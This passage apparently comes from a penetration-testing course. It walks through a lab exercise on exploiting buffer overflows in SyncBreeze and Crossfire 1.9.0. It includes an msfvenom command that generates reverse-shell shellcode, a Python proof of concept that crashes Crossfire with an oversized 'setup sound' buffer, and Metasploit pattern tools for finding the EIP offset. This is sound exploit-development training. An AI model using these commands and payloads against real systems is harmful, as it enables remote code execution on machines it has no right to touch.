
# 11.2.10 Improving the Exploit

The default exit method of Metasploit shellcode following its execution is the **ExitProcess** API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the SyncBreeze service and causing it to crash.

If the program we are exploiting is a threaded application, and in this case it is, we can try to avoid crashing the service completely by using the **ExitThread** API instead, which will only terminate the affected thread of the program. This will make our exploit work without interrupting the usual operation of the SyncBreeze server, and will allow us to repeatedly exploit the server and exit the shell without bringing down the service.

To instruct **msfvenom** to use the *ExitThread* method during shellcode generation, we can use the **EXITFUNC=thread** option as shown in the command below:

```
kali@kali:$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" 
```

Listing 364 - Generating shellcode to use ExitThread

### 11.2.10.1 Exercise

- Update the exploit so that SyncBreeze still runs after exploitation.

### 11.2.10.2 Extra Mile Exercises

In the **Tools** folder of your Windows VM, there are three applications called **VulnApp1.exe**, **VulnApp2.exe**, and **VulnApp3.exe**, each containing a vulnerability. Associated Python proof of concept scripts are also present in the folder. Using the PoCs, write exploits for each of the vulnerable applications.

# 11.3 Wrapping Up

In this module, we discovered and exploited a vulnerability in the SyncBreeze application. Even though this was a known vulnerability, we walked through the steps required to "discover it" and did not rely on previous vulnerability research. This essentially replicated the process of discovering and exploiting a remote buffer overflow.

This process required several steps. First, we discovered a vulnerability in the code (without access to the source) and generated application input that caused an overflow and granted us control of critical CPU registers. Next, we manipulated memory to gain reliable remote code execution and cleaned up the exploit to avoid crashing the target application.

# 12. Linux Buffer Overflows

In this module, we will introduce Linux buffer overflows by exploiting Crossfire, a Linux-based online multiplayer role playing game.

Specifically, Crossfire 1.9.0 is vulnerable to a network-based buffer overflow when passing a string of more than 4000 bytes to the `setup_sound` command. In order to debug the application, we will use the Evans Debugger (EDB), written by Evan Teran, which provides us with a familiar-looking debugging environment, inspired by Ollydbg.

# 12.1 About DEP, ASLR, and Canaries

Recent Linux kernels and compilers have implemented various memory protection techniques such as *Data Execution Prevention* (DEP), *Address Space Layout Randomization* (ASLR), and *Stack Canaries*.

Since the bypass of these protection mechanisms is beyond the scope of this module, our test version of Crossfire has been compiled without stack-smashing protection (stack canaries), ASLR, and DEP.

# 12.2 Replicating the Crash

Our test environment will consist of a dedicated Linux Debian lab client, where we will run and debug the vulnerable application, and our local Kali Linux box where we will launch the remote exploit.

In order to replicate the crash, we will first `rdesktop` to our dedicated Debian Linux client (using the credentials provided in your control panel). Once connected, we will launch a root terminal via the System Tools menu and run Crossfire:

```bash
root@debian:~# cd /usr/games/crossfire/bin/

root@debian:/usr/games/crossfire/bin# ./crossfire
... 
Welcome to CrossFire, v1.9.0
Copyright (C) 1994 Mark Wedel.
Copyright (C) 1992 Frank Tore Johansen.
----------registering SIGPIPE
Initializing plugins
Plugins directory is /usr/games/crossfire/lib/crossfire/plugins/
-> Loading plugin : cfanim.so
CFAnim 2.0a init
CFAnim 2.0a post init
Waiting for connections...
```

Listing 365 - Launching the vulnerable application via a terminal

Once crossfire has launched, it will accept incoming network connections. Next, we will launch the EDB debugger by running the **edb** command:

```
root@debian:~# edb
Starting edb version: 0.9.22
Please Report Bugs & Requests At: https://github.com/eteran-edb-debugger/issues
comparing versions: [2325] [2326]
```

Listing 366 - Launching the debugger via terminal

The layout of EDB is similar to other popular debugging tools, as shown in Figure 222:

![](img/ec25e59d75726b7041242a56d3376832_397_0.png)

To see available processes including the PID and owner, we will select *Attach* from the *File* menu. We can then use the filter option to search for a specific process, which in our case is *crossfire*, select it, and click *OK* to attach to it:

![](img/ec25e59d75726b7041242a56d3376832_398_0.png)

*Figure 223: EDB - Attachable processes window*

When we initially attach to the process, it will be paused. To run it, we simply click the *Run* button. Depending on how the application works within the debugger it might hit an additional breakpoint before letting the application run. In such cases we simply have to press the *Run* button one more time.

![](img/ec25e59d75726b7041242a56d3376832_398_1.png)

*Figure 224: Attaching the application in the debugger*

Once we have attached the debugger to the Crossfire application, we will use the following proof-of-concept code that we created based on information from the public exploit:

```python
#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x98\x08"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Listing 367 - Proof of concept code to crash the Crossfire application

Notice that our **buffer** variable requires specific hex values at the beginning and at the end of it, as well as the "setup sound" string, in order for the application to crash.

Our initial proof-of-concept builds a malicious buffer including the "setup sound" command, connects to the remote service on port 13327, and sends the buffer.

To crash Crossfire, we can run our first proof-of-concept using **python**:

```
kali@kali:~$ python poc_01.py
[*]Sending evil buffer...
#
[*]Payload Sent !
```

Listing 368 - Running the proof-of-concept code from Kali

After running the script, the debugger displays the following error message, clearly indicating the presence of a memory corruption in the *setup sound* command, likely a buffer overflow condition:

![](img/ec25e59d75726b7041242a56d3376832_399_0.png)

Clicking the OK button, we find that the EIP register has been overwritten with our buffer.

### 12.2.1.2 Exercises

- Log in to your dedicated Linux client using the credentials you received.
- On your Kali machine, recreate the proof-of-concept code that crashes the Crossfire server.
- Attach the debugger to the Crossfire server, run the exploit against your Linux client, and confirm that the EIP register is overwritten by the malicious buffer.

# 12.3 Controlling EIP

Our next task is to identify which four bytes in our buffer end up overwriting the vulnerable function return address in order to control the EIP register. We'll use the Metasploit `msf-pattern_create` script to create a unique buffer string:

```
kali@kali:~$ msf-pattern_create -l 4379
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A...  
```

By swapping our original buffer with this new and unique one, and running the proof-of-concept script again, we crash the debugged application, this time overwriting EIP with the following bytes:

![](img/ec25e59d75726b7041242a56d3376832_400_0.png)

Passing this value to the Metasploit `msf-pattern_offset` script shows the following buffer offset for those particular bytes:

```
kali@kali:~$ msf-pattern_offset -q 46367046
[*] Exact match at offset 4368
```
